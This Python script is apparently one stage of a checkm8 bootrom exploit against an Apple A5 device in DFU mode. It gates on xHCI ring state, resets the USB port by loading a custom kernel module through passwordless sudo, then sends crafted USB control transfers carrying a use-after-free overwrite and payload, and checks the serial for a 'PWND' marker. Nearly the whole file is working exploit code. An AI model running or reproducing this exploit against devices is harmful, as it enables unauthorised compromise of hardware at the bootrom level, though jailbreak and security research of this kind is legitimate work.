#!/usr/bin/env python3
"""pwn-stage5.py - mid-attempt-gated stage 3.

Measured Nov 15: the chip only serves our TDs on captures where the
kernel has already made its own failed small reads first (deq_off
grows ~12 TRBs by then - the babble that primes the poisoned handler).
Captures taken at the xhci_setup_device moment (deq_off=0) go silent
in most re-entries: the chip's post-re-entry handler state varies per
re-entry; only some re-entries enter the serving class.

Gate: PR -> fresh capture -> wait for deq_off >= 8 (kernel retries
happening) -> AA-staged crit-IN -> readback verdict. SERVED -> fire
UAF write + payload back-to-back -> IOC12 PR -> verify (long, with
PR assists). Up to 20 rounds.
"""
import ctypes
import fcntl
import importlib.util
import os
import struct
import subprocess
import sys
import time

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TOOLS = os.path.join(REPO, 'tools')

sp = importlib.util.spec_from_file_location('pwn', os.path.join(TOOLS, 'checkm8-a5-pwn.py'))
P = importlib.util.module_from_spec(sp)
sp.loader.exec_module(P)

IOC_CYC = (1 << 30) | (32 << 16) | (ord('R') << 8) | 5
IOC_STATE = (2 << 30) | (40 << 16) | (ord('R') << 8) | 3
RB_SIZE = 4 + 4 + 0x1000
IOC_RW = (3 << 30) | (RB_SIZE << 16) | (ord('R') << 8) | 7
IOC_PORTRESET = (3 << 30) | (16 << 16) | (ord('R') << 8) | 12


def cyc(fd, setup, data, settle_us=1000):
    arr = (ctypes.c_ubyte * max(len(data), 1)).from_buffer_copy(
        bytes(data) if data else b'\x00')
    txn = struct.pack('<8sIBBHIIQ', bytes(setup), len(data), 1, 1, 0,
                      settle_us, 0, ctypes.addressof(arr))
    try:
        fcntl.ioctl(fd, IOC_CYC, txn, True)
        return 0
    except OSError as e:
        _ = arr
        return -e.errno


def readback(fd, n=16):
    rb = bytearray(RB_SIZE)
    struct.pack_into('<I', rb, 0, n)
    fcntl.ioctl(fd, IOC_RW, rb, True)
    st, = struct.unpack_from('<I', rb, 4)
    return st, bytes(rb[8:8 + n])


def state(fd):
    buf = bytearray(40)
    fcntl.ioctl(fd, IOC_STATE, buf, True)
    return struct.unpack_from('<QIIIIIIII', buf, 0)


def pr_module():
    subprocess.run(['sudo', '-n', 'insmod', '/tmp/raw0rb/raw0reset.ko',
                    'bdf=0000:04:00.4', 'port=5', 'mode=1'],
                   capture_output=True, timeout=20)
    subprocess.run(['sudo', '-n', 'rmmod', 'raw0reset'],
                   capture_output=True, timeout=10)


def main():
    payload, overwrite = P.load_payloads('classic')
    verify_class_dmesg = False
    print('*** stage5: mid-attempt-gated, payload=%d overwrite=%d ***'
          % (len(payload), len(overwrite)))

    fd = os.open('/dev/raw0', os.O_RDWR)
    for r in range(20):
        print('== round %d ==' % r)
        f_pre = state(fd)
        pr_module()
        t0 = time.time()
        good = False
        f = f_pre
        while time.time() - t0 < 20.0:
            f = state(fd)
            if f[5] and (f[6] != f_pre[6] or f[7] != f_pre[7] or f[4] != f_pre[4]):
                if f[7] >= 8:
                    good = True
                    break
                if time.time() - t0 > 4.0:
                    break   # ring moved but stayed early; re-PR
            time.sleep(0.003)
        if not good:
            print('   gate miss (deq_off=%d)' % f[7])
            time.sleep(0.7)
            continue
        print('   mid-attempt: deq_off=%d trbs=%d' % (f[7], f[6]))

        rc = cyc(fd, bytes([0x80, 0x06, 0x03, 0x03, 0x0A, 0x04, 0x81, 0x00]),
                 b'\xAA' * 0x41)
        st, data = readback(fd, 32)
        if data == b'\xAA' * 32:
            print('   crit-IN rc=%d -> SILENT' % rc)
            time.sleep(0.4)
            continue
        print('   crit-IN rc=%d -> SERVED: %s' % (rc, data.hex()))

        rc = cyc(fd, bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00]),
                 b'\xCC' * 0x40 + overwrite)
        print('   UAF write rc=%d' % rc)
        rc = cyc(fd, bytes([0x21, 0x01, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x02]),
                 b'\xCC' * 0x40 + payload)
        print('   payload rc=%d' % rc)

        buf = bytearray(struct.pack('<IIII', 1, 0, 0, 0))
        fcntl.ioctl(fd, IOC_PORTRESET, buf, True)
        before, after = struct.unpack_from('<II', buf, 4)
        print('   PR: %08x -> %08x' % (before, after))

        # long verify: the pwned chip may need a few PRs + settle
        t0 = time.time()
        while time.time() - t0 < 25.0:
            serial = P.sysfs_dfu(timeout=2.0)[1]
            if serial:
                print('   serial: %r' % serial)
                if P.PWN_MARKER in serial:
                    print('*** PWNED DFU - host-only checkm8 A5 achieved ***')
                    os.close(fd)
                    return 0
                break
            pr_module()
        else:
            print('   no serial within 25s')
    print('exhausted rounds without PWND')
    os.close(fd)
    return 2


if __name__ == '__main__':
    sys.exit(main())
